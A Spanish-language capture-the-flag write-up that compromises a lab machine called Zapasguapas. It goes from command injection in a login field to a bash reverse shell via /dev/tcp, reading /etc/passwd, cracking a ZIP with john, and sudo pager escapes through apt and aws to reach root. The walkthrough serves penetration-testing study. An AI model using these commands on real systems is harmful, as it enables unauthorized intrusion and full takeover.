# Zapasguapas - Full Detailed Writeup

## 🖥️ Entorno

-   **Máquina atacante:** Kali Linux (10.0.50.4)
-   **Máquina víctima:** Zapasguapas (10.0.50.43)

------------------------------------------------------------------------

# 1️⃣ Enumeración Inicial

## Escaneo completo de puertos

``` bash
nmap -sC -sV -sS -T5 -p- 10.0.50.43
```

Resultado:

    80/tcp open  http    Apache httpd 2.4.57 ((Debian))
    22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)

Tenemos únicamente HTTP y SSH.

------------------------------------------------------------------------

# 2️⃣ Enumeración Web

## Revisión manual

``` bash
curl -i 10.0.50.43
curl -I 10.0.50.43
```

No se observan redirecciones, virtual hosts ni cabeceras interesantes.

------------------------------------------------------------------------

## Fuzzing de directorios

``` bash
gobuster dir -u http://10.0.50.43 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 60 -x php,txt,html
```

Directorios interesantes:

-   `/login.html`
-   `/nike.php`
-   `/include`
-   `/bin`

------------------------------------------------------------------------

# 3️⃣ Análisis del Login

Accedemos a `/login.html`.

Probamos credenciales simples:

    User: Admin
    Pass: Admin

Observamos comportamiento extraño:

-   Usa método **GET**
-   No redirige
-   Respuesta 200
-   Body vacío
-   No muestra error
-   No cambia tamaño de respuesta

Esto ya indica mala práctica.

------------------------------------------------------------------------

## 🔎 Revisando el código fuente

Encontramos:

``` javascript
// Ejecutar el comando proporcionado como contraseña
xhr.open("GET", "run_command.php?username=" + encodeURIComponent(username) + "&password=" + encodeURIComponent(password), true);
```

⚠️ Comentario clave:

    // Ejecutar el comando proporcionado como contraseña

Esto es una pista directa de posible ejecución de comandos.

------------------------------------------------------------------------

# 4️⃣ Confirmación de RCE

Probamos en el campo password:

``` bash
id
```

Resultado:

    uid=33(www-data) gid=33(www-data) groups=33(www-data)

🔥 Tenemos ejecución remota de comandos como `www-data`.

El campo password NO es contraseña real, es un comando del sistema.

------------------------------------------------------------------------

# 5️⃣ Enumeración como www-data

``` bash
whoami
id
pwd
ls -la
cat /etc/passwd
cat /etc/hostname
cat /etc/os-release
uname -a
```

Sistema:

-   Debian 12 (bookworm)
-   Kernel 6.1.0
-   Hostname: zapasguapas

Usuarios interesantes:

-   proadidas
-   pronike

------------------------------------------------------------------------

## Búsqueda de SUIDs

``` bash
find / -perm -4000 2>/dev/null
```

Nada explotable.

------------------------------------------------------------------------

## Búsqueda de Capabilities

``` bash
getcap -r / 2>/dev/null
```

Solo:

    /usr/bin/ping cap_net_raw=ep

No explotable.

------------------------------------------------------------------------

# 6️⃣ Reverse Shell

Como es entorno CTF, lanzamos reverse shell para trabajar cómodamente.

En Kali:

``` bash
rlwrap nc -nvlp 4444
```

En el campo password:

``` bash
bash -c 'bash -i >& /dev/tcp/10.0.50.4/4444 0>&1'
```

🔥 Shell obtenida.

------------------------------------------------------------------------

## Estabilización de TTY

``` bash
/bin/bash -i
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
CTRL+Z
stty raw -echo; fg
```

Shell completamente funcional.

------------------------------------------------------------------------

# 7️⃣ Enumeración Local Post-Explotación

En `/home`:

-   proadidas
-   pronike

En proadidas:

-   user.txt (solo root puede leerlo)

En pronike:

-   nota.txt

Contenido nota:

    Creo que proadidas esta detras del robo de mi contraseña

------------------------------------------------------------------------

## 📦 Archivo interesante

En `/opt` encontramos:

    -rw-r--r--  1 proadidas proadidas  266 Apr 23  2024 importante.zip

Tenemos permisos de lectura.

------------------------------------------------------------------------

# 8️⃣ Crackeo del ZIP

Copiamos a `/tmp`:

``` bash
cp /opt/importante.zip /tmp
```

Transferimos a Kali:

En víctima:

``` bash
python3 -m http.server 8000
```

En Kali:

``` bash
wget http://10.0.50.43:8000/importante.zip
```

------------------------------------------------------------------------

## Extraemos hash

``` bash
zip2john importante.zip > zip.hash
john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash
john --show zip.hash
```

Resultado:

    hotstuff

------------------------------------------------------------------------

## Contenido del ZIP

    User: pronike
    Password: pronike11

------------------------------------------------------------------------

# 9️⃣ Escalada a pronike

``` bash
ssh pronike@10.0.50.43
```

------------------------------------------------------------------------

## sudo -l

    User pronike may run the following commands:
        (proadidas) NOPASSWD: /usr/bin/apt

------------------------------------------------------------------------

# 🔟 Escalada a proadidas

Según GTFOBins, `apt` es explotable usando paginador.

``` bash
sudo -u proadidas apt changelog apt
```

Dentro del paginador:

    !/bin/bash

🔥 Ahora somos proadidas.

------------------------------------------------------------------------

# 1️⃣1️⃣ Escalada Final a root

``` bash
sudo -l
```

Resultado:

    (root) NOPASSWD: /usr/bin/aws

Ejecutamos:

``` bash
sudo -u root aws help
```

Dentro del paginador:

    !/bin/bash

🔥 Root obtenido.

------------------------------------------------------------------------

# 🏁 Flags

``` bash
cat /home/proadidas/user.txt
cat /root/root.txt
```

------------------------------------------------------------------------

# 🧠 Cadena Completa de Compromiso

    RCE (www-data)
    → Reverse Shell
    → Crack ZIP
    → SSH pronike
    → sudo apt → proadidas
    → sudo aws → root

------------------------------------------------------------------------

# 🎯 Técnicas utilizadas

-   RCE vía parámetro GET
-   Reverse shell bash
-   Estabilización TTY
-   Crackeo ZIP con John
-   Escalada por paginadores (less)
-   Abuso de sudo NOPASSWD

------------------------------------------------------------------------

Máquina comprometida completamente.
